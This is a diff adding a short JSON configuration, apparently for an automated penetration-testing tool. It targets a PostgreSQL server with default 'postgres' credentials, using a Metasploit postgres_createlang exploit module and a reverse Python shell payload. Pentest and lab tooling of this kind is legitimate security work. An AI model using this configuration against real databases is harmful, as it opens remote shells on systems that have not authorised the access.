@@ -1,0 +1,11 @@
+{
+"name": "postgres",
+"remote_host": "{{.RHOST}}",
+"remote_port": "5432",
+"database": "postgres",
+"username": "postgres",
+"password": "postgres",
+"exploit": "exploit/multi/postgres/postgres_createlang",
+"payload": "cmd/unix/reverse_python",
+"reverse_shell": true
+}
